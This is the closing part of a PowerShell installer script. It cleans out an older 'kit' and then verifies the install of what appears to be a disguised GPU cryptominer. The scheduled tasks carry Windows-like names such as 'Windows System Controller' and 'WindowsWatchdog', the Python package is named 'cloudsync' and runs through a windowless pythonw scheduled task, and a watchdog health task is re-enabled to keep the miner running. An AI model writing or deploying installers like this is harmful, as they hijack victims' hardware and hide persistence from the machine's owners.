if ($CleanLegacy) {
    Say "[+] removing the old kit..."
    foreach ($t in @('Windows System Controller', 'WindowsWatchdog')) {
        schtasks.exe /Delete /TN $t /F 2>$null | Out-Null
    }
    $old = Join-Path $env:LOCALAPPDATA 'SystemController'
    if (Test-Path $old) {
        Get-Process pythonw, python -ErrorAction SilentlyContinue |
            Where-Object { $_.Path -like "$old*" } | Stop-Process -Force -ErrorAction SilentlyContinue
        Remove-Item $old -Recurse -Force -ErrorAction SilentlyContinue
        Say "  [i] removed $old"
    }
    Get-ChildItem (Join-Path $env:ProgramData 'SCB_*') -Directory -ErrorAction SilentlyContinue |
        ForEach-Object { Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue }
}

# ==============================================================
# 11. verification
# ==============================================================
Say ""
Say "==================== VERIFICATION ===================="
# optional: only verify files that exist in the source -- README/docs may be
    # omitted from a deployment (operator preference, 2026-11-10).
    foreach ($f in ($entryPayload | Where-Object { Test-Path (Join-Path $src $_) })) {
        Check "installed: $f" (Test-Path (Join-Path $InstallDir $f))
    }
if ($modular) {
    Check "cloudsync package installed" (Test-Path (Join-Path $InstallDir 'cloudsync\__main__.py'))
    Check "flat controller.py not installed" (-not (Test-Path (Join-Path $InstallDir 'controller.py')))
    $installedRuntime = $null
    try { $installedRuntime = (Get-Content (Join-Path $InstallDir 'install.json') -Raw | ConvertFrom-Json).runtime } catch { }
    Check "install.json runtime=modular" ($installedRuntime -eq 'modular')
    $taskText = (schtasks.exe /Query /TN "$TaskRoot\$TaskName" /V /FO LIST 2>$null | Out-String)
    Check "task action contains -m cloudsync" ($taskText -match '-m cloudsync')
} else {
    Check "installed: controller.py" (Test-Path (Join-Path $InstallDir 'controller.py'))
}
Check "binary present: $BinaryName" (Test-Path (Join-Path $InstallDir $BinaryName))
Check "install.json" (Test-Path (Join-Path $InstallDir 'install.json'))
Check "pythonw resolved" ([bool]$pythonw)
if ($backupDir) { Check "shadow copy" (Test-Path $backupDir) }
schtasks.exe /Query /TN "$TaskRoot\$TaskName" 2>$null | Out-Null
Check "main task" ($LASTEXITCODE -eq 0)
schtasks.exe /Query /TN "$TaskRoot\$HealthName" 2>$null | Out-Null
Check "health task" ($LASTEXITCODE -eq 0)

$state = Join-Path $InstallDir 'state.json'
if (Test-Path $state) {
    try {
        $s = Get-Content $state -Raw | ConvertFrom-Json
        Ok ("controller alive: pid={0} gpu={1} hashrate={2}" -f $s.pid, $s.gpu, $s.hashrate)
    } catch { Warn "state.json unreadable" }
} else {
    Warn "no state.json yet - controller may still be starting"
}
Say "======================================================"
Say ("failures={0} warnings={1}" -f $script:Fail, $script:Warn)

# Install is done and verified: let the watchdog police the controller again.
try { schtasks.exe /change /tn "$TaskRoot\$HealthName" /enable 2>$null | Out-Null } catch { }
Say "  [i] health task re-enabled"

if ($Prompt -and [Environment]::UserInteractive) {
    Write-Host ""
    Write-Host "Press any key to exit..." -NoNewline
    try { $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') } catch { }
}

if ($script:Fail -gt 0) { exit 1 } else { exit 0 }
